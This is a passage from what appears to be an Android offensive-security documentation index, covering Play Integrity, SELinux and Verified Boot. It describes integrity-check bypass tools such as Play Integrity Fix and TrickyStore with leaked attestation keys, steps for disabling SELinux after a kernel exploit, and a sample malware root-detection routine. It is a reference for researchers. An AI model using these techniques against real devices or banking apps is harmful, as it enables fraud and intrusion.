bypass.</p>"},{"location":"platform-abuse/play-integrity/#banking-app-integration-patterns","title":"Banking App Integration Patterns","text":"Pattern Behavior Login gate Block authentication on devices failing strong integrity Transaction gate Allow login but block transfers on non-passing devices Degraded mode Reduce transaction limits on devices passing only basic integrity Warning only Display warning but allow full functionality <p>The May 2025 enforcement of hardware-backed strong integrity significantly impacted security researchers. Banking apps requiring strong integrity cannot be analyzed on unlocked-bootloader devices without hardware attestation bypass.</p>"},{"location":"platform-abuse/play-integrity/#hardware-vs-software-attestation","title":"Hardware vs Software Attestation","text":""},{"location":"platform-abuse/play-integrity/#software-attestation","title":"Software Attestation","text":"<p>The Play Integrity server evaluates device signals sent by the client (build fingerprint, boot state, etc.) and makes a server-side determination. These signals can be spoofed by modifying system properties and Build fields.</p>"},{"location":"platform-abuse/play-integrity/#hardware-attestation","title":"Hardware Attestation","text":"<p>The device's TEE generates a certificate chain bound to hardware-fused keys. Google's server verifies this chain against a known database of legitimate device keys.</p>"},{"location":"platform-abuse/play-integrity/#key-attestation-chain","title":"Key Attestation Chain","text":"<pre><code>Google Root CA\n  \u2514\u2500\u2500 Google Intermediate CA\n       \u2514\u2500\u2500 Device Attestation Key (in TEE/StrongBox)\n            \u2514\u2500\u2500 App-specific attestation key\n</code></pre> <p>The TEE-generated attestation certificate includes fields that describe the device state:</p> Field Content <code>attestationSecurityLevel</code> TEE or StrongBox <code>verifiedBootState</code> Green (locked), Yellow (custom), Orange (unlocked), Red (unverifiable) <code>osVersion</code> Android version <code>osPatchLevel</code> Security patch date <code>rootOfTrust</code> Verified boot key hash, lock state <p>Hardware attestation is cryptographically bound to the device. Without access to the TEE's private keys, it cannot be spoofed in software. Google can revoke leaked keys via Certificate Revocation Lists in the Play Integrity backend.</p>"},{"location":"platform-abuse/play-integrity/#bypass-techniques","title":"Bypass Techniques","text":""},{"location":"platform-abuse/play-integrity/#magisk-hide-deprecated","title":"Magisk Hide (Deprecated)","text":"<p>The original root hiding mechanism. MagiskHide unmounted Magisk's overlays from the target app's mount namespace and hid the <code>su</code> binary. Deprecated by topjohnwu in Magisk v24 (2022) in favor of Zygisk.</p>"},{"location":"platform-abuse/play-integrity/#zygisk-shamiko","title":"Zygisk + Shamiko","text":"<p>Zygisk operates within the Zygote process, injecting code before app processes fork. Shamiko (from the LSPosed team) hooks into the process startup sequence to:</p> <ul> <li>Hide Magisk's presence from target apps</li> <li>Remove root-related artifacts from the process environment</li> <li>Mask SELinux status modifications</li> <li>Filter <code>/proc</code> entries that reveal root</li> </ul> <p>Shamiko works because it intervenes before the target app's security checks execute. However, it cannot spoof hardware attestation.</p>"},{"location":"platform-abuse/play-integrity/#play-integrity-fix-pif","title":"Play Integrity Fix (PIF)","text":"<p>Originally developed by chiteroman, PIF is a Zygisk module that spoofs device properties to pass software-based integrity checks. It modifies <code>android.os.Build</code> class fields and system properties to match a known-good device fingerprint:</p> <ol> <li>Injects a <code>classes.dex</code> to override Build fields (<code>FINGERPRINT</code>, <code>MODEL</code>, <code>MANUFACTURER</code>, <code>PRODUCT</code>)</li> <li>Hooks native code to modify system property reads</li> <li>Downloads or bundles a device fingerprint profile from a certified device</li> <li>Passes <code>MEETS_DEVICE_INTEGRITY</code> on software attestation</li> </ol> <p>PIF requires periodic fingerprint updates as Google revokes known-bypassed fingerprints. The community maintains fingerprint databases tracking which device profiles currently pass.</p> <p>Active forks as of 2025:</p> Fork Maintainer Focus PlayIntegrityFork osm0sis Broad device support, custom field spoofing PlayIntegrityFix KOWX712 Continued development of chiteroman's approach PIF-NEXT EricInacio01 TrickyStore integration for hardware attestation Zygisk-Assistant snake-4 Lightweight root hiding for KernelSU, Magisk, APatch"},{"location":"platform-abuse/play-integrity/#trickystore-and-hardware-attestation-bypass","title":"TrickyStore and Hardware Attestation Bypass","text":"<p>TrickyStore manipulates the Keystore attestation chain to pass hardware-backed integrity checks on devices with unlocked bootloaders:</p> <ol> <li>Intercepts Keystore attestation requests</li> <li>Substitutes a valid attestation certificate chain from a stock device</li> <li>Signs the attestation with the substitute key</li> </ol> <p>This requires a valid leaked or extracted attestation key from a device with the same model. The supply of valid keys is limited and Google periodically revokes compromised keys, making this an ongoing arms race.</p>"},{"location":"platform-abuse/play-integrity/#bypass-evolution","title":"Bypass Evolution","text":"Era Technique Defeated By 2017-2020 MagiskHide SafetyNet hardware attestation (opt-in) 2020-2022 Universal SafetyNet Fix (kdrag0n) Play Integrity API migration 2022-2023 Early PIF modules Google tightening fingerprint validation 2023-2024 PIF + Shamiko Hardware attestation default enforcement 2024-2025 TrickyStore + PIF-NEXT Key revocation, certificate transparency 2025+ ? Hardware attestation at scale with strong integrity"},{"location":"platform-abuse/play-integrity/#malware-detection-of-rooted-devices","title":"Malware Detection of Rooted Devices","text":"<p>Malware uses Play Integrity as one signal among many to detect analysis environments:</p> <pre><code>private boolean isAnalysisEnvironment() {\n    boolean rooted = new File(\"/system/bin/su\").exists() ||\n                     new File(\"/system/xbin/su\").exists();\n    boolean magisk = new File(\"/sbin/.magisk\").exists();\n    boolean emulator = Build.FINGERPRINT.contains(\"generic\") ||\n                       Build.MODEL.contains(\"Emulator\");\n    return rooted || magisk || emulator;\n}\n</code></pre> <p>Banking trojans like Cerberus and Hook check for root not to refuse running but to adapt behavior -- avoiding analysis-specific actions on rooted/emulated devices while operating normally on consumer devices. Some families (Anatsa, Hook) check whether the device passes basic integrity before executing their payload.</p>"},{"location":"platform-abuse/play-integrity/#common-detection-checks-beyond-play-integrity","title":"Common Detection Checks Beyond Play Integrity","text":"Check What It Detects <code>su</code> binary existence Root access Magisk/KernelSU packages Root management apps Xposed/LSPosed artifacts Hooking frameworks Build.FINGERPRINT contents Emulator or custom ROM <code>/proc/self/maps</code> inspection Frida agent loaded in memory <code>ro.debuggable</code> property Debug build or modified system SELinux permissive mode Modified security policy"},{"location":"platform-abuse/play-integrity/#implications-for-security-researchers","title":"Implications for Security Researchers","text":"Scenario Impact Malware analysis on rooted device PIF + Shamiko required or malware detects analysis Banking app testing Must pass <code>MEETS_DEVICE_INTEGRITY</code> or app refuses to start Custom ROM users Cannot use banking apps without PIF unless ROM passes CTS Enterprise MDM Hardware attestation used for device compliance checks Forensics Unlocked bootloader fails all integrity checks <p>The trend toward hardware attestation narrows the gap for researchers. Practical workarounds:</p> <ul> <li>Using Pixel devices with locked bootloaders and Magisk installed via boot image patching</li> <li>Patching target apps to remove integrity checks (static analysis + smali patching)</li> <li>Using instrumentation frameworks that don't require root (Objection on debug builds)</li> <li>Maintaining separate stock analysis devices alongside rooted research devices</li> </ul>"},{"location":"platform-abuse/play-integrity/#detection-during-analysis","title":"Detection During Analysis","text":"Checking Play Integrity Status <ul> <li><code>adb shell dumpsys package com.google.android.gms | grep version</code> (GMS version)</li> <li>Run a Play Integrity checker app (YASNAC, PIF checker) to see current verdict</li> <li>Check <code>logcat</code> for <code>com.google.android.play.core.integrity</code> entries</li> <li>Monitor Keystore attestation requests via Frida</li> </ul> Identifying Integrity Checks in Apps <ul> <li>Search decompiled code for <code>IntegrityManager</code>, <code>IntegrityTokenRequest</code></li> <li>Look for <code>com.google.android.play.core.integrity</code> package references</li> <li>Check for SafetyNet fallback: <code>SafetyNetClient</code>, <code>SafetyNet.getClient</code></li> <li>Look for nonce generation and server-side verification endpoints</li> </ul>"},{"location":"platform-abuse/play-integrity/#cross-references","title":"Cross-References","text":"<ul> <li>App Sandbox -- the sandbox that Play Integrity verifies has not been compromised</li> <li>Packers -- commercial protectors often integrate Play Integrity checks</li> <li>Dynamic Analysis -- Play Integrity complicates dynamic analysis on modified devices</li> </ul>"},{"location":"platform-abuse/selinux/","title":"SELinux","text":"<p>Security-Enhanced Linux on Android provides mandatory access control (MAC) that confines every process -- including root -- to a defined policy. Since Android 5.0, SELinux runs in enforcing mode on all production devices. For attackers, SELinux is the primary obstacle between a kernel or system exploit and full device control. Understanding its structure, its weaknesses, and the ways it has been bypassed is essential for Android offensive research.</p>"},{"location":"platform-abuse/selinux/#policy-architecture","title":"Policy Architecture","text":"<p>SELinux on Android uses a combination of type enforcement (TE), role-based access control (RBAC), and multi-level security (MLS) to define what every process can access.</p>"},{"location":"platform-abuse/selinux/#type-enforcement","title":"Type Enforcement","text":"<p>Every process and object on the system receives a security label (context) in the format <code>user:role:type:mls_level</code>. Type enforcement rules define allowed interactions between types:</p> <pre><code>allow untrusted_app app_data_file:file { read write open getattr };\nallow untrusted_app activity_service:service_manager find;\n</code></pre> <p>The kernel denies any access not explicitly granted by an <code>allow</code> rule. There is no implicit permission -- even root running as <code>u:r:su:s0</code> is subject to whatever rules exist for the <code>su</code> type.</p>"},{"location":"platform-abuse/selinux/#domain-transitions","title":"Domain Transitions","text":"<p>When a process executes a binary, SELinux can force a domain transition to a new security context. The Android init process starts as <code>u:r:init:s0</code> and transitions child processes into their assigned domains. The Zygote process (<code>u:r:zygote:s0</code>) forks app processes and transitions them into the appropriate app domain based on the app's signing certificate and <code>seinfo</code> tag.</p>"},{"location":"platform-abuse/selinux/#multi-level-security-mls","title":"Multi-Level Security (MLS)","text":"<p>Android uses MLS categories to isolate apps from each other. Each app receives a unique category pair (e.g., <code>s0:c149,c256,c512,c768</code>), preventing one untrusted app from accessing another's files even though both run in the <code>untrusted_app</code> domain. The category assignment is derived from the app's UID.</p>"},{"location":"platform-abuse/selinux/#app-process-contexts","title":"App Process Contexts","text":"<p>The seapp_contexts file maps apps to their SELinux domains based on signing certificate, <code>seinfo</code> tag, and user type.</p> Domain Assigned To Capabilities <code>untrusted_app</code> Third-party apps from Play Store or sideloaded Standard app sandbox, no access to system internals <code>untrusted_app_32</code> 32-bit third-party apps on 64-bit devices Same as <code>untrusted_app</code> with 32-bit ABI <code>platform_app</code> Apps signed with the platform certificate Access to platform-level services and some system APIs <code>system_app</code> Apps in <code>/system/app</code> or <code>/system/priv-app</code> signed with platform cert Broader system access, can interact with system services <code>priv_app</code> Privileged apps in <code>/system/priv-app</code> Extended permissions beyond standard apps <code>isolated_app</code> Isolated service processes (<code>isolatedProcess=true</code>) Extremely restricted, no network, no filesystem access <code>ephemeral_app</code> Instant apps Reduced permissions compared to <code>untrusted_app</code> <p>The <code>seinfo</code> tag is assigned by the mac_permissions.xml file based on the app's signing certificate. Apps signed with the platform key receive <code>seinfo=platform</code>, which maps to the <code>platform_app</code> domain. All other apps default to <code>untrusted_app</code>.</p>"},{"location":"platform-abuse/selinux/#policy-files-and-analysis-tools","title":"Policy Files and Analysis Tools","text":""},{"location":"platform-abuse/selinux/#policy-locations","title":"Policy Locations","text":"Path Contents <code>/sys/fs/selinux/policy</code> Compiled binary policy currently loaded in kernel <code>/vendor/etc/selinux/</code> Vendor-specific policy fragments <code>/system/etc/selinux/</code> System policy fragments <code>/sepolicy</code> Legacy monolithic policy (pre-Android 8.0 Treble) <code>boot.img</code> ramdisk Contains <code>sepolicy</code> on some device configurations"},{"location":"platform-abuse/selinux/#analysis-tools","title":"Analysis Tools","text":"Tool Purpose <code>seinfo</code> Display SELinux policy info, list types and attributes <code>sesearch</code> Search policy rules (allow, neverallow, type_transition) <code>sepolicy-analyze</code> AOSP tool for analyzing compiled policy <code>audit2allow</code> Convert SELinux denial logs into allow rules <code>setenforce</code> Toggle between enforcing (1) and permissive (0) -- requires root <code>getenforce</code> Query current SELinux mode <code>chcon</code> Change security context of a file <code>restorecon</code> Restore file context to policy default <p>Extracting and decompiling the running policy from a device:</p> <pre><code>adb pull /sys/fs/selinux/policy /tmp/sepolicy\nsesearch --allow -s untrusted_app /tmp/sepolicy\nsesearch --allow -t app_data_file /tmp/sepolicy\nseinfo -t /tmp/sepolicy | grep app\n</code></pre>"},{"location":"platform-abuse/selinux/#known-bypasses-and-weaknesses","title":"Known Bypasses and Weaknesses","text":""},{"location":"platform-abuse/selinux/#neverallow-violations","title":"Neverallow Violations","text":"<p>The AOSP policy includes <code>neverallow</code> rules that define security invariants -- transitions and accesses that must never be permitted. These are checked at policy compile time. However, vendor policy additions (particularly on OEM devices shipping custom SELinux rules) have historically introduced rules that violate these invariants.</p> <p>Google's CTS tests verify that neverallow rules are respected, but devices that ship outside the CTS program or with incomplete testing have been caught with policy violations. Research from 8kSec on Android SELinux internals documents how vendor policy fragments can inadvertently weaken the security posture.</p>"},{"location":"platform-abuse/selinux/#permissive-domains-in-production","title":"Permissive Domains in Production","text":"<p>During development, new SELinux domains are initially set to permissive mode to avoid breaking functionality while the correct rules are authored. The AOSP documentation explicitly states that permissive mode is not supported on production devices. CTS tests check that the global SELinux mode is enforcing.</p> <p>However, individual domains can be set to permissive even when the global mode is enforcing. OEM vendors have shipped devices with permissive vendor-specific domains, allowing processes in those domains to bypass all MAC restrictions while the rest of the system remains enforcing. This was common on budget devices from smaller manufacturers who lacked the resources for complete policy development.</p>"},{"location":"platform-abuse/selinux/#cves-involving-selinux-bypass","title":"CVEs Involving SELinux Bypass","text":"CVE Year Description CVE-2022-20421 2022 Android Binder use-after-free achieving full kernel R/W, leading to root and complete SELinux bypass on Pixel 6 CVE-2024-53197 2024 Privilege escalation exploited as part of a zero-day chain reportedly used by Cellebrite against Serbian activists CVE-2025-27363 2025 Malformed binder transactions overwriting kernel structures, bypassing SELinux protections CVE-2025-38352 2025 Local privilege escalation via race condition in POSIX CPU timers, enabling sandbox escape <p>The klecko blog on SELinux bypasses documents historical techniques for defeating SELinux after obtaining kernel code execution, including patching the in-kernel policy, disabling the enforcement flag, and manipulating process credentials.</p>"},{"location":"platform-abuse/selinux/#kernel-exploit-to-selinux-disable","title":"Kernel Exploit to SELinux Disable","text":"<p>Once an attacker achieves kernel code execution (through a kernel vulnerability), SELinux can be neutralized by:</p> <ol> <li>Patching the enforcement flag: Writing <code>0</code> to the kernel's <code>selinux_enforcing</code> variable switches the entire system to permissive mode</li> <li>Modifying process credentials: Overwriting the <code>security</code> field in the task's <code>cred</code> structure to assign an unrestricted SELinux context</li> <li>Disabling LSM hooks: Zeroing out the SELinux hook functions in the Linux Security Module framework</li> </ol> <p>Samsung devices with RKP (Real-time Kernel Protection) implement hypervisor-level protection of these structures, but research has shown that even RKP can be bypassed by targeting the hypervisor itself or finding gaps in its coverage.</p>"},{"location":"platform-abuse/selinux/#magisk-and-selinux","title":"Magisk and SELinux","text":"<p>Magisk provides root access on Android while attempting to maintain a functional SELinux enforcing mode. Understanding how Magisk interacts with SELinux is critical for both root detection and offensive research.</p>"},{"location":"platform-abuse/selinux/#magisksu-context","title":"MagiskSU Context","text":"<p>All processes spawned from the Magisk daemon, including root shells and their child processes, run in the context <code>u:r:magisk:s0</code>. This is a custom domain that Magisk injects into the SELinux policy during boot. The <code>magisk</code> domain is granted broad permissions through injected policy rules, giving root shells access equivalent to the <code>init</code> or <code>kernel</code> domain while maintaining the enforcing state for all other processes.</p>"},{"location":"platform-abuse/selinux/#sepolicy-injection","title":"Sepolicy Injection","text":"<p>The <code>magiskinit</code> binary replaces the stock <code>/init</code> as the first userspace process (PID 1). Before executing the real init, it:</p> <ol> <li>Loads the stock SELinux policy from the boot image or vendor partition</li> <li>Patches the policy in memory to inject the <code>magisk</code> domain and associated rules</li> <li>Writes the modified policy for the kernel to load</li> </ol> <p>This happens before any other process starts, so the injected rules are active from the earliest point of the boot sequence. Magisk modules can provide additional policy patches via <code>sepolicy.rule</code> files, though compatibility varies across devices.</p>"},{"location":"platform-abuse/selinux/#zygisk","title":"Zygisk","text":"<p>Zygisk loads Magisk code directly into the Zygote process, allowing module developers to execute code in every app process before specialization. From a SELinux perspective, the Zygisk code runs within the <code>zygote</code> domain during injection, then transitions to the app's assigned domain when the process specializes. This is relevant for tools that need to run with elevated context before the app sandbox takes effect.</p>"},{"location":"platform-abuse/selinux/#detection-implications","title":"Detection Implications","text":"<p>Because Magisk keeps SELinux in enforcing mode, simple <code>getenforce</code> checks return \"Enforcing\" on rooted Magisk devices. This means enforcement mode alone is not a reliable indicator of an unmodified device. More sophisticated detection checks for the presence of the <code>magisk</code> type in the loaded policy:</p> <pre><code>cat /sys/fs/selinux/policy | strings | grep magisk\n</code></pre>"},{"location":"platform-abuse/selinux/#permissive-mode-detection","title":"Permissive Mode Detection","text":""},{"location":"platform-abuse/selinux/#how-malware-uses-permissive-mode","title":"How Malware Uses Permissive Mode","text":"<p>When SELinux is in permissive mode, critical security restrictions are disabled. As documented by Magisk's developer, any arbitrary app can permanently root a device without user consent by exploiting known vulnerabilities that are normally blocked by SELinux policy. When SELinux is permissive during boot, Zygote also disables seccomp syscall filters, further unrestricting third-party processes.</p> <p>Malware targeting rooted or compromised devices checks for permissive mode to determine if advanced exploitation techniques are available. A permissive device is effectively unprotected -- the app sandbox, inter-app isolation, and system service restrictions all become advisory rather than enforced.</p>"},{"location":"platform-abuse/selinux/#detection-by-banking-apps-and-security-software","title":"Detection by Banking Apps and Security Software","text":"<p>Banking apps and root detection libraries check SELinux status through multiple methods:</p> Method Detail <code>getenforce</code> command Runs the binary and parses stdout for \"Enforcing\" or \"Permissive\" <code>/sys/fs/selinux/enforce</code> Reads the kernel's enforcement flag directly (0 = permissive, 1 = enforcing) <code>android.os.SELinux</code> Hidden system API with <code>isSELinuxEnforced()</code> method Process context check Reads <code>/proc/self/attr/current</code> to verify the expected SELinux label Policy analysis Checks for overly permissive rules or custom domains like <code>magisk</code>"},{"location":"platform-abuse/selinux/#how-root-hiders-counter-detection","title":"How Root Hiders Counter Detection","text":"<p>Root management solutions (Magisk, KernelSU, APatch) maintain enforcing mode specifically to pass these checks. The SELinux status reported through all standard interfaces shows \"Enforcing\" because the system genuinely is enforcing -- Magisk achieves its goals through injected policy rules rather than disabling enforcement.</p> <p>Tools like Shamiko and PlayIntegrityFix go further by hiding the <code>magisk</code> domain from policy inspection and spoofing device properties that root detection examines.</p>"},{"location":"platform-abuse/selinux/#offensive-relevance","title":"Offensive Relevance","text":""},{"location":"platform-abuse/selinux/#for-exploit-development","title":"For Exploit Development","text":"<p>SELinux policy analysis reveals what a compromised process can and cannot do. Before developing a post-exploitation payload, an attacker must know what the target domain's policy allows:</p> <pre><code>sesearch --allow -s untrusted_app /tmp/sepolicy | wc -l\nsesearch --allow -s untrusted_app -t binder_device /tmp/sepolicy\nsesearch --allow -s platform_app -c service_manager /tmp/sepolicy\n</code></pre> <p>The gap between what <code>untrusted_app</code> can do and what <code>platform_app</code> or <code>system_app</code> can do defines the value of privilege escalation from one domain to another.</p>"},{"location":"platform-abuse/selinux/#for-malware-analysis","title":"For Malware Analysis","text":"<p>When analyzing a sample that requires root or system-level access, understanding the SELinux context it expects to run in reveals its operational requirements. Malware that checks for permissive mode likely relies on exploitation techniques blocked by enforcing policy. Malware that functions within <code>untrusted_app</code> constraints is more sophisticated -- it operates within the sandbox using permitted APIs like accessibility services.</p>"},{"location":"platform-abuse/selinux/#for-forensics","title":"For Forensics","text":"<p>SELinux audit logs (<code>/data/misc/audit/audit.log</code> and <code>dmesg</code>) record all policy denials. On a compromised device, these logs reveal what the attacker attempted that was blocked by policy, providing a trace of exploitation activity even when the attack itself left no other artifacts.</p>"},{"location":"platform-abuse/selinux/#cross-references","title":"Cross-References","text":"<ul> <li>Accessibility Abuse operates entirely within the <code>untrusted_app</code> SELinux domain, requiring no policy bypass</li> <li>Persistence Techniques must work within SELinux constraints on non-rooted devices</li> <li>Verified Boot protects the SELinux policy files from modification on locked bootloader devices</li> <li>Play Integrity checks enforcing mode as one signal in device integrity attestation</li> </ul>"},{"location":"platform-abuse/verified-boot/","title":"Verified Boot","text":"<p>Android Verified Boot (AVB) establishes a cryptographic chain of trust from the hardware root of trust through the bootloader, kernel, and system partitions. Its purpose is to guarantee that all executed code comes from a trusted source and has not been tampered with. From an offensive perspective, Verified Boot determines what persists across reboots, what firmware modifications are possible, and what the consequences of bootloader unlocking are for security research and real-world attacks.</p>"},{"location":"platform-abuse/verified-boot/#boot-chain","title":"Boot Chain","text":"<p>The boot chain verifies each stage before transferring control to the next:</p> <pre><code>Hardware Root of Trust\n    -&gt; Primary Bootloader (PBL, in ROM)\n        -&gt; Secondary Bootloader (SBL / ABL)\n            -&gt; Boot Image (kernel + ramdisk)\n                -&gt; System partition (dm-verity)\n                    -&gt; Vendor partition (dm-verity)\n</code></pre> <p>Each stage verifies the cryptographic signature of the next stage using keys embedded in the current stage. The hardware root of trust is burned into the SoC at manufacturing and cannot be modified. If any stage fails verification, the boot process halts or displays a warning depending on the device's lock state.</p>"},{"location":"platform-abuse/verified-boot/#key-components","title":"Key Components","text":"Component Role Hardware Root of Trust Immutable key in SoC, verifies first-stage bootloader PBL (Primary Bootloader) ROM-based, loads and verifies SBL SBL/ABL (Secondary Bootloader) Verifies and loads boot image, handles fastboot boot.img Contains kernel and ramdisk, verified by bootloader vbmeta.img AVB metadata containing hashes and signatures for all verified partitions dm-verity Kernel-level block verification for system/vendor partitions"},{"location":"platform-abuse/verified-boot/#dm-verity","title":"dm-verity","text":"<p>dm-verity provides transparent integrity checking of block devices using a Merkle hash tree. Every 4KB block on the system partition has a hash stored in the tree. The root hash of the tree is signed and embedded in the boot image or vbmeta partition.</p> <p>During runtime, the kernel checks each block's hash on read. If a block has been modified, the hash check fails and the read returns an I/O error. This makes persistent modification of the system partition impossible on devices with locked bootloaders and enforcing dm-verity.</p>"},{"location":"platform-abuse/verified-boot/#hash-tree-structure","title":"Hash Tree Structure","text":"<pre><code>                Root Hash (signed)\n               /                  \\\n        Hash Node             Hash Node\n       /        \\            /        \\\n  Block Hash  Block Hash  Block Hash  Block Hash\n      |           |           |           |\n  Block 0     Block 1     Block 2     Block 3\n</code></pre> <p>The root hash is the single value that, when verified against the embedded signature, guarantees the integrity of the entire partition. Modifying any block invalidates its hash, which propagates up the tree to invalidate the root hash.</p>"},{"location":"platform-abuse/verified-boot/#enforcement-modes","title":"Enforcement Modes","text":"Mode Behavior Enforcing I/O error on corrupted blocks, system may restart Logging Corruption logged but reads succeed (development builds) EIO Default for production, returns EIO on corrupted blocks Restart Reboots the device when corruption is detected"},{"location":"platform-abuse/verified-boot/#android-verified-boot-20-avb","title":"Android Verified Boot 2.0 (AVB)","text":"<p>AVB 2.0 (introduced in Android 8.0, mandatory since Android 9.0) extends verification beyond the boot image to cover all partitions through a unified metadata structure.</p>"},{"location":"platform-abuse/verified-boot/#vbmeta-structure","title":"vbmeta Structure","text":"<p>The <code>vbmeta.img</code> partition contains:</p> <ul> <li>Hash descriptors for partitions verified at boot time (boot, dtbo)</li> <li>Hashtree descriptors for dm-verity protected partitions (system, vendor, product)</li> <li>The public key used to verify the vbmeta signature</li> <li>Rollback index values for anti-downgrade protection</li> <li>Flags controlling verification behavior</li> </ul> <p>All descriptors are signed with the OEM's private key. The corresponding public key is embedded in the bootloader. The vbmeta signature is the single point of trust -- if it verifies, all partition hashes are trusted.</p>"},{"location":"platform-abuse/verified-boot/#chained-partitions","title":"Chained Partitions","text":"<p>AVB supports delegated verification where individual partitions can be signed with different keys. The vbmeta for each partition is chained to the root vbmeta through a chain of public keys. This allows different teams (SoC vendor, device OEM, carrier) to independently sign their respective partitions while maintaining a single chain of trust.</p>"},{"location":"platform-abuse/verified-boot/#rollback-protection","title":"Rollback Protection","text":"<p>Rollback protection prevents downgrading to older, vulnerable firmware versions. Each vbmeta structure contains a rollback index -- a monotonically increasing integer stored in tamper-evident hardware (typically a RPMB partition on eMMC or a fuse-based counter).</p> Component Storage Rollback index in vbmeta Embedded in the signed vbmeta metadata Stored rollback index Written to RPMB or hardware fuses on the device <p>During boot, the bootloader compares the vbmeta rollback index against the stored value. If the vbmeta index is lower than the stored index, boot is rejected. When a new image with a higher index boots successfully, the stored index is updated.</p> <p>Google made rollback protection mandatory for devices launching with Android 9.0. On Xiaomi devices, the anti-rollback mechanism is particularly aggressive -- attempting to flash firmware with a lower rollback index on a locked bootloader can permanently brick the device.</p>"},{"location":"platform-abuse/verified-boot/#offensive-implications","title":"Offensive Implications","text":"<p>Rollback protection prevents attackers from exploiting known vulnerabilities in older firmware. Without it, an attacker with physical access could flash an older, vulnerable bootloader or system image, exploit a patched vulnerability, and then reflash current firmware. The rollback index makes this downgrade path unavailable on locked-bootloader devices.</p> <p>On unlocked bootloaders, rollback protection can be bypassed by flashing custom vbmeta with the verification flags disabled or by modifying the RPMB-stored index through vendor-specific tooling.</p>"},{"location":"platform-abuse/verified-boot/#boot-states","title":"Boot States","text":"<p>Android defines four verified boot states that indicate the integrity of the boot chain. These states are displayed to the user as colored warning screens during boot and are exposed to apps through system properties and attestation.</p> State Color Meaning Bootloader Warning GREEN None Fully verified chain of trust, OEM-signed images Locked No warning screen YELLOW Yellow Verified boot with custom root of trust (user-provided key) Locked 10-second warning screen ORANGE Orange Bootloader unlocked, verification disabled Unlocked 10-second warning screen RED Red Verification failed -- corrupted or unsigned boot image on locked device Locked Warning screen, user must confirm to continue <p>The AOSP boot flow documentation specifies that the RED state warning screen requires the user to press a physical button to continue booting, and the screen cannot be dismissed by software alone. The ORANGE and YELLOW screens auto-dismiss after 10 seconds.</p>"},{"location":"platform-abuse/verified-boot/#boot-state-in-attestation","title":"Boot State in Attestation","text":"<p>The verified boot state is included in hardware key attestation certificates and is checked by Play Integrity API. A device in ORANGE state (unlocked bootloader) fails the <code>MEETS_DEVICE_INTEGRITY</code> verdict, which banking apps and other security-sensitive applications use to deny service on modified devices.</p>"},{"location":"platform-abuse/verified-boot/#bootloader-unlocking","title":"Bootloader Unlocking","text":"<p>Unlocking the bootloader is the prerequisite for all firmware-level modifications. It disables verification enforcement (transitioning to ORANGE state) and typically wipes all user data.</p>"},{"location":"platform-abuse/verified-boot/#what-unlocking-enables","title":"What Unlocking Enables","text":"<ul> <li>Flashing custom boot images (including Magisk-patched images)</li> <li>Flashing custom ROMs (LineageOS, GrapheneOS, CalyxOS)</li> <li>Disabling dm-verity via modified vbmeta</li> <li>Running custom kernels for research and exploit development</li> <li>Fastboot access for partition-level read/write</li> </ul>"},{"location":"platform-abuse/verified-boot/#what-unlocking-breaks","title":"What Unlocking Breaks","text":"Capability Impact Play Integrity <code>MEETS_DEVICE_INTEGRITY</code> Fails -- banking apps, DRM, and enterprise MDM may block the device Hardware key attestation boot state Reports ORANGE/unlocked to attestation servers Factory reset protection (FRP) May be circumvented depending on OEM implementation Warranty Voided on most OEM devices Samsung Knox Permanently tripped e-fuse (irreversible, even if bootloader is re-locked) Widevine L1 Some devices downgrade to L3, losing HD DRM playback"},{"location":"platform-abuse/verified-boot/#oem-unlock-policies","title":"OEM Unlock Policies","text":"<p>Not all devices support bootloader unlocking. Carriers (especially US carriers) frequently request OEMs to disable the unlock capability. Samsung, Xiaomi, and Huawei require account-based unlock authorization with waiting periods. Apple's iOS has no equivalent -- the bootloader is permanently locked.</p>"},{"location":"platform-abuse/verified-boot/#firmware-persistence-attacks","title":"Firmware Persistence Attacks","text":""},{"location":"platform-abuse/verified-boot/#triada-preinstalled-on-devices","title":"Triada Preinstalled on Devices","text":"<p>The Triada trojan represents the most significant real-world abuse of the boot chain. In March 2025, Kaspersky discovered a new variant of Triada embedded directly in the firmware of counterfeit Android smartphones, affecting over 4,500 devices worldwide.</p> <p>The infection occurs during manufacturing -- before devices reach end users. The supply chain compromise inserts Triada into the system partition, where it runs with system-level privileges and persists across factory resets because it is part of the verified system image.</p> <p>Triada's firmware-level capabilities include:</p> <ul> <li>Intercepting and manipulating SMS messages</li> <li>Stealing cryptocurrency by replacing wallet addresses in clipboard</li> <li>Downloading and executing additional payloads</li> <li>Hijacking browser sessions and replacing links</li> <li>Controlling social media accounts</li> </ul> <p>Since the malware is part of the OEM-signed system image, dm-verity and AVB protect the malicious code with the same integrity guarantees that protect legitimate system components. The verified boot chain trusts whatever the OEM signs -- if the OEM's build pipeline is compromised, verified boot protects the attacker's payload.</p> <p>Google previously documented Triada firmware infections traced to third-party vendors in the manufacturing supply chain. The xHelper variant affected thousands of low-cost devices sold in emerging markets.</p>"},{"location":"platform-abuse/verified-boot/#other-firmware-persistence","title":"Other Firmware Persistence","text":"<p>Beyond Triada, firmware-level persistence has been observed in:</p> Campaign Vector Year Lemon Group / Guerrilla Preinstalled on budget devices, 8.9M+ devices affected 2023 BadBox Preinstalled backdoor on off-brand Android TV boxes 2023 Triada supply chain Counterfeit smartphones with firmware-embedded trojan 2025 <p>These campaigns share a common pattern: the compromise occurs before the device reaches the consumer, and the malicious code is protected by the same verified boot guarantees that protect the legitimate OS.</p>"},{"location":"platform-abuse/verified-boot/#magisk-boot-image-patching","title":"Magisk Boot Image Patching","text":"<p>Magisk achieves root access by patching the boot image rather than modifying the system partition. This is the standard approach for security researchers and the rooting community because it preserves dm-verity on the system partition.</p>"},{"location":"platform-abuse/verified-boot/#how-it-works","title":"How It Works","text":"<p>The patching process, implemented in <code>boot_patch.sh</code>, modifies the boot image ramdisk:</p> <ol> <li>Unpack: <code>magiskboot</code> extracts the boot image into its components (kernel, ramdisk, dtb, etc.)</li> <li>Backup: The original ramdisk is compressed and stored for later restoration</li> <li>Inject magiskinit: The stock <code>/init</code> binary in the ramdisk is replaced with <code>magiskinit</code></li> <li>Add overlay: Magisk binaries (<code>magisk</code>, <code>magiskinit</code>, <code>magiskpolicy</code>) are added to an overlay directory within the ramdisk</li> <li>Configure: Environment variables control whether dm-verity and forced encryption are preserved (<code>KEEPVERITY</code>, <code>KEEPFORCEENCRYPT</code>)</li> <li>Repack: <code>magiskboot</code> reassembles the patched boot image</li> </ol> <p>The patched boot image is then flashed via fastboot:</p> <pre><code>fastboot flash boot magisk_patched.img\n</code></pre>"},{"location":"platform-abuse/verified-boot/#boot-sequence-with-magisk","title":"Boot Sequence with Magisk","text":"<p>When the device boots the patched image:</p> <ol> <li>Kernel loads and executes <code>/init</code> from the ramdisk -- which is now <code>magiskinit</code></li> 